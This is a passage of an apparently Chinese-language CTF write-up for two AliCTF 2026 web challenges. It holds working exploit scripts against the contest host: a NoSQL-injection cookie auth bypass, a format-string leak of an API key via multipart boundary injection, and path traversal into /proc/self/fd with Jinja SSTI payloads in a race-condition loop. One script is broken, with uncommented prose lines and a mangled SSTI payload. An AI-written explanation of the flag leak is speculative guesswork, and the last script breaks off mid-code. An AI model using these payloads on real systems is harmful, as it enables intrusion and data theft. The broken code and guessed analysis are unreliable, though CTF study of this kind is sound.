下 JNDI 漏洞的利用方法</a></li><li><a href=https://mp.weixin.qq.com/s/UdKf8PhTlXuWwfBDQXDGuA>CVE-2024-49194 Databricks JDBC 驱动 JNDI 注入漏洞分析</a></li><li><a href=https://github.com/X1r0z/JNDIMap>JNDIMap</a></li><li><a href="https://www.bilibili.com/video/BV1AZmEBVEsU/?share_source=copy_web&amp;vd_source=8c76f8e232993e8e3083ed467fe773f7">NIKO15次梦碎Major</a>、<a href="https://www.bilibili.com/video/BV1GEm9BoEnq/?spm_id_from=333.337.search-card.all.click&amp;vd_source=6870219ddced853e80ae239d5319e97c">😭一生只哭18次😭</a>、<a href="https://www.bilibili.com/video/BV15Y4y117sn/?share_source=copy_web&amp;vd_source=8c76f8e232993e8e3083ed467fe773f7">【活着】“所以生命啊，它苦涩如歌”</a></li></ol><h2 id=easy_login>easy_login</h2><p>通过审计 src/server.ts，可以发现</p><p>admin 用户会随机生成一个长字符串密码</p><p><img src=/img/2026-alictf/15.png alt=img></p><p>Flag 在 /admin 接口中返回，该接口要求当前登录用户必须是 admin</p><p><img src=/img/2026-alictf/16.png alt=img></p><p>使用 cookie-parser 解析 Cookie，并将解析出的 sid 直接给数据库查询</p><p><img src=/img/2026-alictf/17.png alt=img></p><p>在 sessionMiddleware 中以下代码存在nosql注入</p><p><img src=/img/2026-alictf/18.png alt=img></p><p>当 Cookie 以 j: 开头时，cookie-parser 会尝试将其解析为 JSON 对象。如果我们将 sid 设置为 {"$ne": &ldquo;random_value&rdquo;}，查询语句将变为 db.sessions.findOne({ sid: { &ldquo;$ne&rdquo;: &ldquo;random_value&rdquo; } })</p><p>所以我们可以通过 /visit 接口，利用应用内部的 Bot 自动进行管理员登录。这将导致数据库中产生一个admin 用户的 Session，再使用 NoSQL 注入绕过 sid 的精确匹配。设置Cookie 为sid=j:{"$ne": &ldquo;anything&rdquo;} 访问 /admin，就可以绕过鉴权</p><p>exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s2>&#34;http://223.6.249.127:12106&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 第一步：唤醒 Bot 登录，产生 Admin Session</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Waking up the bot...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>target</span><span class=si>}</span><span class=s2>/visit&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;url&#34;</span><span class=p>:</span> <span class=s2>&#34;http://example.com&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 第二步：使用 NoSQL 注入 Cookie 劫持 Admin 权限</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Exploiting NoSQL Injection...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>cookies</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1># &#39;j:&#39; 前缀触发 cookie-parser 的 JSON 解析逻辑</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;sid&#34;</span><span class=p>:</span> <span class=s1>&#39;j:{&#34;$ne&#34;: &#34;null&#34;}&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>res</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>target</span><span class=si>}</span><span class=s2>/admin&#34;</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Server Response:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>alictf{0c6b7a19-8a74-4129-8dc8-913e98cad823}
</span></span></code></pre></td></tr></table></div></div><h2 id=cutter>Cutter</h2><p>审计代码可以发现admin路由下存在可以利用的一些点</p><p><img src=/img/2026-alictf/19.png alt=img></p><p>path.join<code>拼接</code>tmpl<code>参数时没有过滤</code>..`，导致路径穿越和任意文件读取</p><p>读取的文件内容直接通过 <code>render_template_string</code> 渲染。如果我们能控制被读取的文件内容，就能实现 SSTI</p><p>但是这里存在一个问题就是需要API_KEY才能实现</p><p>还有action路由下存在格式化字符串漏洞可以利用</p><p><img src=/img/2026-alictf/20.png alt=img></p><p>在 <code>debug</code> 模式下，允许通过 <code>content.format(app)</code> 泄露对象属性。这可以用来泄露全局变量中的 <code>API_KEY</code></p><p>heartbeat路由</p><p><img src=/img/2026-alictf/21.png alt=img></p><p>可以发现我们可以通过请求参数控制任意的 <code>headers，</code>可以注入 <code>Content-Type</code> 来改变 <code>httpx</code> 发往由 <code>/action</code> 接收的数据包的结构</p><p><code>/heartbeat</code> 硬编码了 <code>action</code> 类型为 <code>echo</code>，无法直接触发 <code>/action</code> 的 <code>debug</code> 模式。但通过注入 <code>Content-Type</code> 头部，我们可以劫持数据包，设置 <code>client=Content-Type</code>和<code>token=multipart/form-data; boundary=HACKER</code>，在 <code>text</code> 字段中构造包含 <code>{"type": "debug"}</code> 的 <code>action</code> 部分</p><p>这样当 <code>/action</code> 收到请求时，它会优先使用我们注入的 <code>HACKER</code> 作为 Boundary。后端会读取我们在 <code>text</code> 中构造的第二个 <code>action</code> 字段，从而覆盖掉原始的 <code>echo</code></p><p>泄漏 Payload:<code>{0.view_functions[index].globals[API_KEY]}</code></p><p>可以得到<code>API_KEY = 911ec63d10f2bd607080ca3ff396a647699de5159e13f99c615e03fd9aa2a806</code></p><p>拿到了 <code>API_KEY</code> 后，我们可以访问 <code>/admin</code>。虽然可以 LFI 读文件，但是我们不知道flag的具体文件名。</p><p><img src=/img/2026-alictf/22.png alt=img></p><p>在 Linux 中，<code>/proc/self/fd/</code> 包含了进程当前打开的所有文件描述符。FD 3通常是服务器监听的 Socket。FD 4-10: 通常是当前正在处理请求的输入流（<code>wsgi.input</code>）或者因请求体过大而产生的临时缓存文件。</p><p>所以如果我们包含正在读取我们请求体的那个 FD，<code>/admin</code> 就会读取我们发送的内容。</p><p>让ai写了个FD条件竞争的脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>TARGET_IP</span> <span class=o>=</span> <span class=s2>&#34;223.6.249.127&#34;</span>
</span></span><span class=line><span class=cl><span class=n>TARGET_PORT</span> <span class=o>=</span> <span class=s2>&#34;34696&#34;</span>
</span></span><span class=line><span class=cl><span class=n>BASE_URL</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;http://</span><span class=si>{</span><span class=n>TARGET_IP</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>TARGET_PORT</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>API_KEY</span> <span class=o>=</span> <span class=s2>&#34;911ec63d10f2bd607080ca3ff396a647699de5159e13f99c615e03fd9aa2a806&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>trigger_upload</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Starting large upload to /heartbeat...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># Payload: list root directory</span>
</span></span><span class=line><span class=cl>    <span class=n>ssti</span> <span class=o>=</span> <span class=s2>&#34;{{ config.class.init.globals[&#39;os&#39;].listdir(&#39;/&#39;) }}&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>padding</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>600000</span><span class=p>)</span> <span class=c1># 600KB padding to ensure it goes to disk</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>ssti</span> <span class=o>+</span> <span class=n>padding</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># We use a long timeout to keep the connection open as long as possible</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>BASE_URL</span><span class=si>}</span><span class=s2>/heartbeat&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;text&#34;</span><span class=p>:</span> <span class=n>payload</span><span class=p>},</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>30</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[] Upload finished with status </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[] Upload error (expected if we block): </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>brute_fd_ssti</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># Wait for upload to start and potentially hit /action</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Starting FD brute force on /admin...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;Authorization&#34;</span><span class=p>:</span> <span class=n>API_KEY</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>fd</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mi>25</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># We hit /admin which will read the FD</span>
</span></span><span class=line><span class=cl>            <span class=c1># If the FD is the temp file, it will render our SSTI</span>
</span></span><span class=line><span class=cl>            <span class=n>params</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;tmpl&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;../../../../proc/self/fd/</span><span class=si>{</span><span class=n>fd</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>BASE_URL</span><span class=si>}</span><span class=s2>/admin&#34;</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>params</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=s2>&#34;[&#39;&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span> <span class=ow>and</span> <span class=s2>&#34;flag&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[!!!] SUCCESS! Found listing on FD </span><span class=si>{</span><span class=n>fd</span><span class=si>}</span><span class=s2>:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;FD </span><span class=si>{</span><span class=n>fd</span><span class=si>}</span><span class=s2> returned 200 but no flag listing. Snippet: </span><span class=si>{</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>[:</span><span class=mi>50</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Run</span> <span class=n>upload</span> <span class=ow>in</span> <span class=n>background</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>trigger_upload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Brute</span> <span class=n>force</span> <span class=n>FDs</span>
</span></span><span class=line><span class=cl><span class=n>brute_fd_ssti</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><ol><li>由一个线程向 <code>/heartbeat</code> 发送超大请求（几百 KB 的填充数据），目的是让 Werkzeug 将请求体写入磁盘上的临时文件。</li><li>主线程同时在 <code>/admin</code> 上循环尝试读取各显 FD（如 <code>/proc/self/fd/6</code>）。</li></ol><p>运行脚本的目标不是直接读 Flag 文件，而是希望 FD 里面是我们发送的 SSTI Payload <code>{{ config...os.listdir('/') }}</code>，从而让我们执行命令去寻找 Flag。</p><p>结果在进行到Step 1147的时候收到了如下响应： <code>FD 6 returned 200 but no flag listing. Snippet: alictf{301e7a69...}</code></p><p>ai分析原因：</p><ol><li>残存数据 (Residual Buffers): 服务器是多线程的。在之前的格式化字符串攻击中，我们可能已经通过 format(app) 引起了某些包含了 flag 或者系统环境信息的变量被输出到了某个内部缓冲区。</li><li>异步连接泄露: 当我们通过 /admin 包含正在处理的 Socket FD 时，我们读取的是该 FD 对应的 内核级缓冲区 (Kernel Buffer)。如果这个时候服务器刚刚处理完一个含有泄露信息的请求，或者正在处理带有敏感数据的其他内部请求，通过 LFI 读取 FD 会直接捕获到这些“尚未清除”的原始数据。</li><li>内存映射: 在某些 Python 版本中，render_template_string 的处理逻辑结合 Werkzeug 对 wsgi.input 的处理，在极端高并发的情况下，FD 可能会指向一个被重置前留有前一个请求内容的内存页。</li></ol><p>简单来说：我们像是在服务器的数据交换管道里插了一根吸管（通过读取 FD），本来想吸出自己的 Payload，结果顺带吸出了前序攻击或系统处理中残存在管道里的 Flag。</p><p>exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- Configuration ---</span>
</span></span><span class=line><span class=cl><span class=n>TARGET_URL</span> <span class=o>=</span> <span class=s2>&#34;http://223.6.249.127:34696&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>leak_api_key</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Stage 1: Leaking API_KEY via Format String &amp; Boundary Injection...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Payload to leak the API_KEY variable from app&#39;s global scope</span>
</span></span><span class=line><span class=cl>    <span class=c1># index is the view function name, which is &#39;action&#39; or &#39;heartbeat&#39; in this context</span>
</span></span><span class=line><span class=cl>    <span class=n>payload_str</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>{0.view_functions[index].__globals__[API_KEY]}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>MY_BOUNDARY</span> <span class=o>=</span> <span class=s2>&#34;AaB03x&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># We inject a fake multipart body inside the &#39;text&#39; field to override the &#39;action&#39; part</span>
</span></span><span class=line><span class=cl>    <span class=n>inner_payload</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>payload_str</span><span class=si>}</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=sa>f</span><span class=s2>&#34;--</span><span class=si>{</span><span class=n>MY_BOUNDARY</span><span class=si>}</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;Content-Disposition: form-data; name=&#34;action&#34;; filename=&#34;action.json&#34;</span><span class=se>\r\n\r\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;{&#34;type&#34;: &#34;debug&#34;}</span><span class=se>\r\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>        <span class=sa>f</span><span class=s2>&#34;--</span><span class=si>{</span><span class=n>MY_BOUNDARY</span><span class=si>}</span><span class=s2>--</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;client&#34;</span><span class=p>:</span> <span class=s2>&#34;content-type&#34;</span><span class=p>,</span> <span class=c1># Header Injection: Control Content-Type</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;token&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;multipart/form-data; boundary=</span><span class=si>{</span><span class=n>MY_BOUNDARY</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=c1># Set our custom boundary</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;text&#34;</span><span class=p>:</span> <span class=n>inner_payload</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/heartbeat&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># The API_KEY is a 64-char hex string (os.urandom(32).hex())</span>
</span></span><span class=line><span class=cl>            <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;([a-f0-9]</span><span class=si>{64}</span><span class=s2>)&#34;</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>api_key</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Found API_KEY: </span><span class=si>{</span><span class=n>api_key</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>api_key</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[-] Error leaking API_KEY: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>find_flag_filename</span><span class=p>(</span><span class=n>api_key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Stage 2: Finding Flag filename via LFI -&gt; SSTI Race Condition...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>ssti_payload</span> <span class=o>=</span> <span class=s2>&#34;{{ config.__class__.__init__.__globals__[&#39;os&#39;].listdir(&#39;/&#39;) }}&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>stop_event</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Event</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>spammer</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=ow>not</span> <span class=n>stop_event</span><span class=o>.</span><span class=n>is_set</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># Keep sending the SSTI payload to fill socket buffers</span>
</span></span><span class=line><span class=cl>                <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>TARGET_URL</span><span class=si>}</span><span class=s2>/heartbeat&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;text&#34;</span><span class=p>:</span> <span class=n>ssti_payload</span><span class=p>},</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span> <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Start background spammers</span>
</span></span><span class=line><span class=cl>    <span class=n>threads</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
